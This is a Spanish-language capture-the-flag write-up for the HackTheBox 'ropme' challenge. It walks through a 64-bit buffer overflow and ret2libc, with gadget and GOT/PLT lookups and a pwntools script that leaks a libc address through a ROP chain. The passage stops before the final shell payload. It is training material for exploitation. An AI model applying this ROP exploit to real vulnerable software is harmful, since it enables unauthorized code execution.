<!doctype html><html lang=es><head><title>ropme | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta itemprop=description content="Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta name=twitter:description content="Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta property="og:description" content="Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta name=robots content="index, follow"><meta name=author content="7Rocky"><meta name=twitter:author content="7Rocky"><meta property="og:author" content="7Rocky"><meta name=image content="https://7rocky.github.io/images/pwn.png"><meta name=twitter:image content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="7Rocky"><meta itemprop=name content="ropme"><meta property="og:title" content="ropme"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/ropme/"><meta itemprop=keywords content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><link href=/css/main.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><script src=/js/main.js></script><div style=display:none>$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title=es><img alt=es height=30px src=/images/es.png width=30px></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href=/en/ctf/htb-challenges/pwn/ropme/ title=en><img alt=en height=30px src=/images/en.png style="border:4px solid#000;border-radius:100%" width=30px></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">PWN</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/ropme/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/ropme/&text=ropme" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/htb-challenges/pwn/ropme/&title=ropme" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">ropme</h1><br></header><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>ropme</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Arch:     amd64-64-little
RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
Stack:    <span class=code-dark-red>No canary found</span>
NX:       <span class=code-dark-green>NX enabled</span>
PIE:      <span class=code-dark-red>No PIE (0x400000)</span>  
</code></pre></div><p>Podemos utilizar Ghidra para analizar el binario y mirar el código fuente en C descompilado:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>local_48</span><span class=mtk1>[</span><span class=mtk6>64</span><span class=mtk1>];</span>

  <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"ROP</span> <span class=mtk4>me</span> <span class=mtk4>outside,</span> <span class=mtk4>how</span> <span class=mtk6>\'</span><span class=mtk4>about</span> <span class=mtk4>dah?"</span><span class=mtk1>);</span>  
  <span class=mtk8>fflush</span><span class=mtk1>(stdout);</span>
  <span class=mtk8>fgets</span><span class=mtk1>(local_48, </span><span class=mtk6>500</span><span class=mtk1>, stdin);</span>

  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><p>El binario es vulnerable a <em>Buffer Overflow</em> porque la variable llamada <code>local_48</code> tiene 64 bytes asignados como <em>buffer</em>, pero el programa está leyendo hasta 500 bytes de <code>stdin</code> y guardando los datos en <code>local_48</code>, desbordando el <em>buffer</em> reservado si el tamaño de los datos de entrada es mayor que 64 bytes.</p><p>Podemos verificar que el programa se rompe en esta situación:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./ropme</span>
ROP me outside, how 'about dah?
asdf

<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'print("A" * 100)'</span> | <span class=code-dark-green>./ropme</span>
ROP me outside, how 'about dah?
zsh: done                              python3 -c 'print("A" * 100)' |  
zsh: segmentation fault (core dumped)  ./ropme
</code></pre></div><p>Debido a que tenemos un binario de 64 bits sin canario, el <em>offset</em> necesario para desbordar el <em>buffer</em> y llegar a la pila (<em>stack</em>) es 72 (ya que después de los 64 bytes reservados se encuentra el valor de <code>$rbp</code> guardado y justo después la dirección de retorno).</p><p>Como el binario tiene protección NX, tenemos que utilizar <em>Return Oriented Programming</em> (ROP) para ejecutar código arbitrario. Esta técnica hace uso de <em>gadgets</em> que son conjuntos de intrucciones que terminan en <code>ret</code> (normalmente). Podemos añadir una lista de direcciones de <em>gadgets</em> en la pila para que cuando un <em>gadget</em> se ejecute, vuelva a la pila y se ejecute el siguiente <em>gadget</em>. De ahí el nombre de ROP <em>chain</em>.</p><p>Esto es un <em>bypass</em> de la protección NX, ya que no estamos ejecutando instrucciones en la pila (<em>shellcode</em>), sino que estamos redirigiendo el programa a direcciones específicas que son ejecutables y que contienen las instrucciones que queremos.</p><p>Para conseguir ejecución de comandos, usaremos un ataque Ret2Libc. Esta técnica consiste en llamar a <code>system</code> en Glibc usando <code>"/bin/sh"</code> como primer argumento a la función (que también se encuentra en Glibc). El problema que tenemos que solucionar es ASLR, que es una protección habilitada en librerías compartidas para aleatorizar una dirección base.</p><p>Como tenemos que llamar a <code>system</code> y usar <code>"/bin/sh"</code>, tenemos que saber las direcciones de dichos valores en Glibc en tiempo de ejecución (estas direcciones serán diferentes en cada ejecución). Por tanto, tenemos que encontrar una manera de fugar una direción de Glibc porque lo único que es aleatorio es la dirección base de Glibc; el resto de las direcciones se calculan mediante <em>offsets</em> a dicha dirección base.</p><p>El proceso de fuga de una función involucra llamar a <code>puts</code> con una dirección de la Tabla de <em>Offsets</em> Globales (<em>Global Offset Table</em>, GOT) como primer argumento (por ejemplo, <code>puts</code> también). Esta tabla contiene las direcciones reales de las funciones externas usadas por el programa (si han sido resueltas previamente). Como <code>puts</code> se utiliza en el binario, para llamarla, solamente tenemos que usar la Tabla de Enlaces a Procedimentos (<em>Procedure Linkage Table</em>, PLT), que aplica un salto a la dirección real de <code>puts</code>.</p><p>Otra consideración es el uso de <code>pop rdi; ret</code> como <em>gadget</em> principal. Debido a la convención de llamadas a funciones en binarios de 64 bits, el primer argumento debe estar almacenado en el registro <code>$rdi</code>. La instrucción <code>pop rdi</code> tomará el siguiente valor de la pila lo lo guardará en <code>$rdi</code>.</p><p>Perfecto, vamos a empezar con el proceso de fuga. Estos son los valores que necesitamos:</p><ul><li>Dirección del <em>gadget</em> <code>pop rdi; ret</code> (<code>0x4006d3</code>):</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>ropme</span> | <span class=code-dark-green>grep</span> <span class=code-dark-yellow>'pop rdi ; ret'</span>  
0x00000000004006d3 : <span class=code-red>pop rdi ; ret</span>
</code></pre></div><ul><li>Dirección de <code>puts</code> en la GOT (<code>0x601018</code>):</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>objdump</span> -R <span class=mtku>ropme</span> | <span class=code-dark-green>grep</span> puts
0000000000601018 R_X86_64_JUMP_SLOT  <span class=code-red>puts</span>@GLIBC_2.2.5  
</code></pre></div><ul><li>Dirección de <code>puts</code> en la PLT (<code>0x4004e0</code>):</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>objdump</span> -d <span class=mtku>ropme</span> | <span class=code-dark-green>grep</span> puts@plt
00000000004004e0 &lt;<span class=code-red>puts@plt</span>&gt;:
  40063a:       e8 a1 fe ff ff          callq  4004e0 &lt;<span class=code-red>puts@plt</span>&gt;  
</code></pre></div><ul><li>Dirección del <code>main</code> (<code>0x400626</code>):</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s <span class=mtku>ropme</span> | <span class=code-dark-green>grep</span> main
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_<span class=code-red>main</span>@GLIBC_2.2.5 (2)  
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_<span class=code-red>main</span>@@GLIBC_
    66: 0000000000400626    71 FUNC    GLOBAL DEFAULT   14 <span class=code-red>main</span>
</code></pre></div><p>Podemos comenzar con este <em>script</em> en Python:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk1>context</span><span class=mtk1>,</span> <span class=mtk1>log</span><span class=mtk1>,</span> <span class=mtk1>p64,</span> <span class="mtk8 mtku">remote</span><span class=mtk1>,</span> <span class="mtk8 mtku">sys</span><span class=mtk1>,</span> <span class=mtk1>u64</span>

<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span> <span class=mtk5>=</span> <span class=mtk4>'ropme'</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>get_process</span><span class=mtk1>():</span>
    <span class=mtk5>if</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>:</span>
        <span class=mtk5>return</span> <span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span><span class=mtk1>.process()</span>

    <span class=mtk1>host</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>].</span><span class=mtk8>split</span><span class=mtk1>(</span><span class=mtk4>':'</span><span class=mtk1>)</span>
    <span class=mtk5>return</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>host</span><span class=mtk1>,</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>port</span><span class=mtk1>))</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
    <span class=mtk1>p</span> <span class=mtk5>=</span> <span class=mtk8>get_process</span><span class=mtk1>()</span>

    <span class=mtk1>pop_rdi_ret</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>4006d3</span>
    <span class=mtk1>puts_got</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>601018</span>
    <span class=mtk1>puts_plt</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>4004e0</span>
    <span class=mtk1>main_addr</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>400626</span>

    <span class=mtk1>offset</span> <span class=mtk5>=</span> <span class=mtk6>72</span>
    <span class=mtk1>junk</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk1>offset</span>

    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>junk</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>puts_got</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>puts_plt</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>main_addr</span><span class=mtk1>)</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>"ROP</span> <span class=mtk4>me</span> <span class=mtk4>outside,</span> <span class=mtk4>how</span> <span class=mtk4>'about</span> <span class=mtk4>dah?</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>  

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>interactive</span><span class=mtk1>()</span>


<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
    <span class=mtk8>main</span><span class=mtk1>()</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
[<span class=code-blue>*</span>] './ropme'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x400000)</span>
[<span class=code-green>+</span>] Starting local process './ropme': pid 17107  
[<span class=code-blue>*</span>] Switching to interactive mode
P\x14\xc3\xf5\x7f
ROP me outside, how 'about dah?
<span class=code-red>$</span>
</code></pre></div><p>Vemos que retornamos al <code>main</code> y que la fuga de memoria está ahí. Podemos formatearla como una dirección en hexadecimal con estas líneas:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>puts_addr</span> <span class=mtk5>=</span> <span class=mtk1>u64(</span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>().</span><span class=mtk8>strip</span><span class=mtk1>().</span><span class=mtk8>ljust</span><span class=mtk1>(</span><span class=mtk6>8</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>))</span>  
<span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Leaked</span> <span class=mtk4>puts()</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>puts_addr</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>)
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
[<span class=code-blue>*</span>] './ropme'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x400000)</span>
[<span class=code-green>+</span>] Starting local process './ropme': pid 20470  
[<span class=code-blue>*</span>] Leaked puts() address: 0x7f4c3fd82450
[<span class=code-blue>*</span>] Switching to interactive mode
ROP me outside, how 'about dah?
<span class=code-red>$</span>
</code></pre></div><p>Nótese que necesitamos volver a ejecutar el <code>main</code> porque tenemos que introducir otro <em>payload</em> sin parar el programa.</p><p>Perfecto. Ahora podemos calcular la dirección base de Glibc, que se puede realizar con un simple cálculo. Podemos restar la dirección real de <code>puts</code> y su <em>offset</em> en Glibc para conseguir la dirección base. Vamos a extraer todos los <em>offsets</em> necesarios (nótese que estamos resolviendo el reto en local):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ldd</span> <span class=mtku>ropme</span>
        linux-vdso.so.1 (0x00007ffcb83ea000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f39d687d000)  
        /lib64/ld-linux-x86-64.so.2 (0x00007f39d6a83000)
</code></pre></div><ul><li><em>Offset</em> de <code>puts</code> (<code>0x84450</code>):</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s <span class=mtku>/lib/x86_64-linux-gnu/libc.so.6</span> | <span class=code-dark-green>grep</span> puts
   195: 0000000000084450   476 FUNC    GLOBAL DEFAULT   15 _IO_<span class=code-red>puts</span>@@GLIBC_2.2.5
   430: 0000000000084450   476 FUNC    WEAK   DEFAULT   15 <span class=code-red>puts</span>@@GLIBC_2.2.5
   505: 0000000000124360  1268 FUNC    GLOBAL DEFAULT   15 <span class=code-red>puts</span>pent@@GLIBC_2.2.5
   692: 0000000000126030   728 FUNC    GLOBAL DEFAULT   15 <span class=code-red>puts</span>gent@@GLIBC_2.10
  1160: 0000000000082d10   384 FUNC    WEAK   DEFAULT   15 f<span class=code-red>puts</span>@@GLIBC_2.2.5
  1708: 0000000000082d10   384 FUNC    GLOBAL DEFAULT   15 _IO_f<span class=code-red>puts</span>@@GLIBC_2.2.5
  2345: 000000000008e350   159 FUNC    WEAK   DEFAULT   15 f<span class=code-red>puts</span>_unlocked@@GLIBC_2.2.5  
</code></pre></div><ul><li><em>Offset</em> de <code>system</code> (<code>0x522c0</code>):</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s <span class=mtku>/lib/x86_64-linux-gnu/libc.so.6</span> | <span class=code-dark-green>grep</span> system
   237: 0000000000153a00   103 FUNC    GLOBAL DEFAULT   15 svcerr_<span class=code-red>system</span>err@@GLIBC_2.2.5  
   619: 00000000000522c0    45 FUNC    GLOBAL DEFAULT   15 __libc_<span class=code-red>system</span>@@GLIBC_PRIVATE
  1430: 00000000000522c0    45 FUNC    WEAK   DEFAULT   15 <span class=code-red>system</span>@@GLIBC_2.2.5
</code></pre></div><ul><li><em>Offset</em> de <code>"/bin/sh"</code> (<code>0x1b45bd</code>):</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>strings</span> -atx <span class=mtku>/lib/x86_64-linux-gnu/libc.so.6</span> | <span class=code-dark-green>grep</span> /bin/sh  
 1b45bd <span class=code-red>/bin/sh</span>
</code></pre></div><p>Entonces, podemos calcular las direcciones reales de <code>system</code> y <code>"/bin/sh"</code> en tiempo de ejecución porque tenemos la dirección base de Glibc en tiempo de ejecución. Vamos a probarlo:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>puts_offset</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>84450</span>
<span class=mtk1>system_offset</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>522c0</span>
<span class=mtk1>bin_sh_offset</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>1b45bd</span>

